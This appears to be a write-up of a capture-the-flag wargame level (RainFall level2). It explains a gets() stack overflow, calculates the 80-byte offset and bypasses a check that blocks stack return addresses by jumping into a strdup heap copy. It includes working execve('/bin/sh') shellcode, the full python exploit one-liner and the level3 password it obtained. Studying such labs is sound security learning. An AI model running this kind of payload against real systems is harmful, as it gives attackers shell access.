Inside level 2 we found 

level2@RainFall:~$ ls
level2
level2@RainFall:~$ ./level2 
dwwdw
dwwdw
level2@RainFall:~$ 


Step 1 : Understand the Vulnerability
------

after checking the file wiht GDB we found that the main function is calling a function P check "asm_analysis.md"

and inside the P functions there is a a gets() function  "0x080484ed <+25>:	call   0x80483c0 <gets@plt>" 
That means Unlimited input => Stack buffer overflow

Step 2 : Calculate Buffer Size
------

Buffer is at         :    -0x4c(%ebp)
Return address is at :     0x4(%ebp)

How the stack looks like inside p:

push   %ebp
mov    %esp,%ebp
sub    $0x68,%esp

This creates a stack frame like this:

Higher addresses
------------------------
Return Address      <-- 0x4(%ebp)
Old EBP             <-- 0x0(%ebp)
------------------------
Local variables
Buffer              <-- -0x4c(%ebp)           0x4c = 76 so Buffer starts 76 bytes below EBP
------------------------
Lower addresses


So first:

76 bytes → reach EBP
But wait… At EBP there is: Old saved EBP (4 bytes). We must overwrite that too before reaching the return address.
So we add: + 4 bytes (saved EBP)
From that we can say that 76 (Buffer) + 4 (saved EBP) = 80 bytes (0x4c + 0x4 = 0x50) = 80

Step 3 : THe protection check
------

Now let's take a look at this part:

mov    0x4(%ebp),%eax     ; load return address
mov    %eax,-0xc(%ebp)

mov    -0xc(%ebp),%eax
and    $0xb0000000,%eax
cmp    $0xb0000000,%eax   Addresses starting with: 0xbxxxxxxx are ussually Stack addresses (in 32-bit Linux)
jne    safe               What is this doing?  It checks:   (return_address & 0xb0000000) == 0xb0000000

If TRUE → program prints something and exits.
If FALSE → it continues and returns normally.

So they are trying to prevent: Returning to stack (no classic shellcode in stack allowed). This is a ret2stack protection.

What to do ?
-----------

We should jump to somewhere not starting with 0xb

Step 4
------

Inside gdb we found the function strdup@plt in the address 0x080483e0  
This will help beacuse strdup() does malloc()
so it will copy our input into the heap and return the heap address

So if we input shellcode:

gets() → stores input in stack
strdup() → copies it into heap

Heap address returned: 0x0804a008
And notice: 0x0804a008 ≠ 0xbxxxxxxx
So the protection does not block it.

so we need to put the shellcode of execve("/bin/sh", NULL, NULL) which is :\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80 (check explanation in syscallABI.txt)

the shellcode is 21 bytes 

We need execution flow like this:
--------------------------------

1) Overflow
2) Overwrite return address
3) Jump to strdup@plt
4) strdup copies our shellcode to heap
5) Return into heap address
6) Execute shellcode from heap

(gdb) run

Starting program: /home/user/level2/level2 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa                            
Program received signal SIGSEGV, Segmentation fault.
0x61616161 in ?? ()
(gdb) 


In x86 programs, EAX is used for: Return values from functions

When a function returns, the result is stored in EAX.



so :



(gdb) info registers eax
eax            0x804a008	134520840

(gdb) x/s 0x804a008
0x804a008:	 'a' <repeats 64 times>, "J\205\004\baaaaaaaa"

(gdb) info registers eip
eip            0x61616161	0x61616161  (0x64 = 'a')

Right after strdup() executes:
strdup returns pointer to heap copy.
Return value of a function in 32-bit = stored in EAX. So: eax = 0x0804a008
Means: The heap copy of our input starts at 0x0804a008.

Now lets finish it

level2@RainFall:~$ (python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A"*59 + "\x08\xa0\x04\x08"'; cat) | ./level2
j
 X�Rh//shh/bin��1�̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
whoami
level3
pwd
/home/user/level2
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02



( python ... ; cat ) | ./level2

generate payload
+
keep stdin open
↓
send everything to ./level2


Python prints exploit payload
↓
payload sent through pipe to ./level2
↓
program enters function p()
↓
fflush() clears output buffer
↓
gets() reads input into stack buffer
↓
gets() copies payload without size check
↓
buffer overflow occurs
↓
saved EBP overwritten
↓
return address overwritten with 0x0804a008
↓
program performs security check on return address
↓
check passes because 0x0804a008 is not a stack address
↓
puts() prints the user input
↓
strdup() copies the input to heap memory
↓
function p() finishes
↓
ret instruction executes
↓
EIP loaded with 0x0804a008
↓
CPU jumps to shellcode stored in buffer
↓
shellcode executes execve("/bin/sh")
↓
interactive shell appears